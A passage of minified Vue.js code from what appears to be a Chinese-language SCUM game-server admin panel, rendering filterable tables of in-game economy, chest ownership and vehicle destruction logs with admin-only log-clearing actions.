0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),t.otherConfig&&t.otherConfig.before?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("交易前详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("现金:")]),i("strong",{staticStyle:{color:"#1890ff","margin-left":"10px"}},[e._v(e._s(t.otherConfig.before.cash))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("金条:")]),i("strong",{staticStyle:{color:"gold","margin-left":"10px"}},[e._v(e._s(t.otherConfig.before.gold))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("银行卡余额:")]),i("strong",{staticStyle:{color:"#18900f","margin-left":"10px"}},[e._v(e._s(t.otherConfig.before.bankAccountBalance))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("商户余额:")]),i("strong",{staticStyle:{color:"#18900f","margin-left":"10px"}},[e._v(e._s(t.otherConfig.before.traderFunds))])])]:e._e(),t.otherConfig&&t.otherConfig.after?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("交易后详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("现金:")]),i("strong",{staticStyle:{color:"#1890ff","margin-left":"10px"}},[e._v(e._s(t.otherConfig.after.cash))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("金条:")]),i("strong",{staticStyle:{color:"gold","margin-left":"10px"}},[e._v(e._s(t.otherConfig.after.gold))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("银行卡余额:")]),i("strong",{staticStyle:{color:"#18900f","margin-left":"10px"}},[e._v(e._s(t.otherConfig.after.bankAccountBalance))]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("商户余额:")]),i("strong",{staticStyle:{color:"#18900f","margin-left":"10px"}},[e._v(e._s(t.otherConfig.after.traderFunds))])])]:e._e(),"npcPurchase"===t.type&&t.otherConfig&&t.otherConfig.details?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("购入详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.economyNpcPurcahseListColumns,"data-source":t.otherConfig.details,"row-key":"item",pagination:!1,bordered:"",scroll:{x:"100%"},size:"small"}})]:e._e(),"npcSell"===t.type&&t.otherConfig&&t.otherConfig.details?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("卖出详情")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.economyNpcSellListColumns,"data-source":t.otherConfig.details,"row-key":"item",pagination:!1,bordered:"",scroll:{x:"100%"},size:"small"}})]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.economyListPagination.pageSize,current:e.economyListPagination.pageNum,total:e.economyListPagination.total},on:{change:e.onChangeEconomyListPagination,showSizeChange:e.onShowSizeChangeEconomyListPagination}})],1)])],1)}),[],!1,null,"30cc2340",null),Zi=Xi.exports,Wi={name:"ChestOwnershipRecord",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingChestOwnershipRecordListTable:!1,chestOwnershipRecordListFilter:{fromScumId:void 0,fromSteamId:void 0,toScumId:void 0,toSteamId:void 0,timeStampStart:void 0,timeStampEnd:void 0},chestOwnershipRecordListColumns:[{title:"旧归属者游戏名称",key:"fromScumId",dataIndex:"fromScumId",width:180,align:"center",scopedSlots:{customRender:"fromScumId"}},{title:"旧归属者Steam ID",key:"fromSteamId",dataIndex:"fromSteamId",width:150,align:"center",scopedSlots:{customRender:"fromSteamId"}},{title:"新归属者游戏名称",key:"toScumId",dataIndex:"toScumId",width:180,align:"center",scopedSlots:{customRender:"toScumId"}},{title:"新归属者Steam ID",key:"toSteamId",dataIndex:"toSteamId",width:150,align:"center",scopedSlots:{customRender:"toSteamId"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],chestOwnershipRecordListData:[],chestOwnershipRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedChestOwnershipRecordIds:[],selectedRowKeys:[]}},mounted:function(){this.getChestOwnershipRecordList()},methods:{onChestOwnershipRecordListCleanFilter:function(){var e=this;this.chestOwnershipRecordListPagination.pageNum=1,this.$nextTick((function(){e.getChestOwnershipRecordList(!0)}))},onChestOwnershipRecordListFilter:function(){var e=this;this.chestOwnershipRecordListPagination.pageNum=1,this.$nextTick((function(){e.getChestOwnershipRecordList()}))},onChangeChestOwnershipRecordListPagination:function(e){var t=this;this.chestOwnershipRecordListPagination.pageNum=e,this.$nextTick((function(){t.getChestOwnershipRecordList()}))},onShowSizeChangeChestOwnershipRecordListPagination:function(e,t){var i=this;this.chestOwnershipRecordListPagination.pageNum=1,this.chestOwnershipRecordListPagination.pageSize=t,this.$nextTick((function(){i.getChestOwnershipRecordList()}))},getChestOwnershipRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.chestOwnershipRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.chestOwnershipRecordListFilter={fromScumId:void 0,fromSteamId:void 0,toScumId:void 0,toSteamId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.chestOwnershipRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingChestOwnershipRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/chestOwnershipRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingChestOwnershipRecordListTable=!1,200===c.status&&(t.chestOwnershipRecordListPagination.total=c.data.count,t.chestOwnershipRecordListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingChestOwnershipRecordListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.chestOwnershipRecordListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanChestOwnershipRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/chestOwnershipRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getChestOwnershipRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Qi=Wi,Ji=Object(S.a)(Qi,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"箱子归属记录"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空箱子归属日志吗"},on:{confirm:e.cleanChestOwnershipRecord}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空箱子归属日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChestOwnershipRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onChestOwnershipRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("旧归属者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chestOwnershipRecordListFilter.fromScumId,callback:function(t){e.$set(e.chestOwnershipRecordListFilter,"fromScumId",t)},expression:"chestOwnershipRecordListFilter.fromScumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("旧归属者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chestOwnershipRecordListFilter.fromSteamId,callback:function(t){e.$set(e.chestOwnershipRecordListFilter,"fromSteamId",t)},expression:"chestOwnershipRecordListFilter.fromSteamId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("新归属者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chestOwnershipRecordListFilter.toScumId,callback:function(t){e.$set(e.chestOwnershipRecordListFilter,"toScumId",t)},expression:"chestOwnershipRecordListFilter.toScumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("新归属者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.chestOwnershipRecordListFilter.toSteamId,callback:function(t){e.$set(e.chestOwnershipRecordListFilter,"toSteamId",t)},expression:"chestOwnershipRecordListFilter.toSteamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.chestOwnershipRecordListFilter.timestampStart,e.chestOwnershipRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.chestOwnershipRecordListFilter,"timestampStart",t[0]),e.$set(e.chestOwnershipRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.chestOwnershipRecordListColumns,"data-source":e.chestOwnershipRecordListData,expandedRowKeys:e.expandedChestOwnershipRecordIds,"row-key":"id",pagination:!1,loading:e.loadingChestOwnershipRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedChestOwnershipRecordIds.find((function(e){return e===i.id}))&&e.expandedChestOwnershipRecordIds.push(i.id);else{var a=Object.keys(e.expandedChestOwnershipRecordIds).find((function(t){return e.expandedChestOwnershipRecordIds[t]===i.id}));void 0!==a&&e.expandedChestOwnershipRecordIds.splice(a,1)}}},scopedSlots:e._u([{key:"fromScumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.chestOwnershipRecordFromUser&&a.chestOwnershipRecordFromUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.chestOwnershipRecordFromUser.userName}})}}},[e._v("("+e._s(a.chestOwnershipRecordFromUser.userName)+")")]):e._e()]}},{key:"toScumId",fn:function(t,a){return[i("span",[e._v(e._s(t))]),a.chestOwnershipRecordToUser&&a.chestOwnershipRecordToUser.userName?i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.chestOwnershipRecordToUser.userName}})}}},[e._v("("+e._s(a.chestOwnershipRecordToUser.userName)+")")]):e._e()]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedChestOwnershipRecordIds.find((function(e){return e===t.id}))?["string"==typeof t.rawText?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("日志原文")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.rawText)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.rawText.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}})]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("箱子ID")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.chestId))])]),t.fromSteamId&&t.fromSteamId.length?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("旧归属人信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.fromScumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.fromSteamId)+")")])])]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("新归属人信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("strong",{staticStyle:{color:"#1890ff"}},[e._v(e._s(t.toScumId))]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("("+e._s(t.toSteamId)+")")])])]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.chestOwnershipRecordListPagination.pageSize,current:e.chestOwnershipRecordListPagination.pageNum,total:e.chestOwnershipRecordListPagination.total},on:{change:e.onChangeChestOwnershipRecordListPagination,showSizeChange:e.onShowSizeChangeChestOwnershipRecordListPagination}})],1)])],1)}),[],!1,null,"6a58efe5",null),ea=Ji.exports,ta={name:"VehicleDestructionRecord",components:{MapLocations:J},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,actionTypeList:[{value:"Disappeared",label:"消失",color:"blue"},{value:"Destroyed",label:"损毁",color:"red"},{value:"VehicleInactiveTimerReached",label:"已达到未激活时限",color:"yellow"},{value:"ForbiddenZoneTimerExpired",label:"禁区超时停放",color:"darkred"}],cleanLoading:!1,loadingVehicleDestructionRecordListTable:!1,vehicleDestructionRecordListFilter:{ownerScumId:void 0,ownerSteamId:void 0,area:void 0,actionType:void 0,vehicleType:void 0,vehicleId:void 0,timeStampStart:void 0,timeStampEnd:void 0},vehicleDestructionRecordListColumns:[{title:"事件类型",key:"actionType",dataIndex:"actionType",width:120,align:"center",scopedSlots:{customRender:"actionType"}},{title:"载具类型",key:"vehicleType",dataIndex:"vehicleType",width:150,align:"center",scopedSlots:{customRender:"vehicleType"}},{title:"载具ID",key:"vehicleId",dataIndex:"vehicleId",width:150,align:"center",scopedSlots:{customRender:"vehicleId"}},{title:"事件发生坐标(区域)",key:"locationsArea",dataIndex:"locationsArea",width:180,align:"center",scopedSlots:{customRender:"locationsArea"}},{title:"拥有者游戏名称",key:"ownerScumId",dataIndex:"ownerScumId",width:180,align:"center",scopedSlots:{customRender:"ownerScumId"}},{title:"拥有者Steam ID",key:"ownerSteamId",dataIndex:"ownerSteamId",width:150,align:"center",scopedSlots:{customRender:"ownerSteamId"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],vehicleDestructionRecordListData:[],vehicleDestructionRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedVehicleDestructionRecordIds:[],gameArealList:[],selectedRowKeys:[]}},mounted:function(){this.getVehicleDestructionRecordList()},methods:{onVehicleDestructionRecordListCleanFilter:function(){var e=this;this.vehicleDestructionRecordListPagination.pageNum=1,this.$nextTick((function(){e.getVehicleDestructionRecordList(!0)}))},onVehicleDestructionRecordListFilter:function(){var e=this;this.vehicleDestructionRecordListPagination.pageNum=1,this.$nextTick((function(){e.getVehicleDestructionRecordList()}))},onChangeVehicleDestructionRecordListPagination:function(e){var t=this;this.vehicleDestructionRecordListPagination.pageNum=e,this.$nextTick((function(){t.getVehicleDestructionRecordList()}))},onShowSizeChangeVehicleDestructionRecordListPagination:function(e,t){var i=this;this.vehicleDestructionRecordListPagination.pageNum=1,this.vehicleDestructionRecordListPagination.pageSize=t,this.$nextTick((function(){i.getVehicleDestructionRecordList()}))},getVehicleDestructionRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.vehicleDestructionRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.vehicleDestructionRecordListFilter={ownerScumId:void 0,ownerSteamId:void 0,area:void 0,actionType:void 0,vehicleType:void 0,vehicleId:void 0,timeStampStart:void 0,timeStampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.vehicleDestructionRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingVehicleDestructionRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/vehicleDestructionRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingVehicleDestructionRecordListTable=!1,200===c.status&&(t.vehicleDestructionRecordListPagination.total=c.data.count,t.vehicleDestructionRecordListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingVehicleDestructionRecordListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.vehicleDestructionRecordListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},getGameAreaList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/serverConfigAdminSys/gameAreaList"});case 3:200===(i=t.sent).status&&(e.gameArealList=i.data),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanVehicleDestructionRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/vehicleDestructionRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getVehicleDestructionRecordList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},ia=ta,aa=Object(S.a)(ia,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"载具销毁记录"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空载具销毁日志吗"},on:{confirm:e.cleanVehicleDestructionRecord}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空载具销毁日志")])],1)]:e._e()],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onVehicleDestructionRecordListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onVehicleDestructionRecordListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommandsMulti()}}},[e._v("全部复制到剪贴板")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("载具类型:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.vehicleType,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"vehicleType",t)},expression:"vehicleDestructionRecordListFilter.vehicleType"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("载具ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.vehicleId,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"vehicleId",t)},expression:"vehicleDestructionRecordListFilter.vehicleId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("事件类型:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.actionType,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"actionType",t)},expression:"vehicleDestructionRecordListFilter.actionType"}},e._l(e.actionTypeList,(function(t){return i("a-select-option",{key:t.value,attrs:{title:t.label}},[e._v(e._s(t.label))])})),1),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("事件所在区域:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.area,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"area",t)},expression:"vehicleDestructionRecordListFilter.area"}},e._l(e.gameArealList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block"}},[e._v("拥有者游戏名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.ownerScumId,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"ownerScumId",t)},expression:"vehicleDestructionRecordListFilter.ownerScumId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("拥有者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.vehicleDestructionRecordListFilter.ownerSteamId,callback:function(t){e.$set(e.vehicleDestructionRecordListFilter,"ownerSteamId",t)},expression:"vehicleDestructionRecordListFilter.ownerSteamId"}}),i("div",{staticStyle:{width:"120px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.vehicleDestructionRecordListFilter.timestampStart,e.vehicleDestructionRecordListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.vehicleDestructionRecordListFilter,"timestampStart",t[0]),e.$set(e.vehicleDestructionRecordListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.vehicleDestructionRecordListColumns,"data-source":e.vehicleDestructionRecordListData,expandedRowKeys:e.expandedVehicleDestructionRecordIds,"row-key":"id",pagination:!1,loading:e.loadingVehicleDestructionRecordListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedVehicleDestructionRecordIds.find((function(e){return e===i.id}))&&e.expandedVehicleDestructionRecordIds.push(i.id);else{var a=Object.keys(e.expandedVehicleDestructionRecordIds).find((function(t){return e.expandedVehicleDestructionRecordIds[t]===i.id}));void 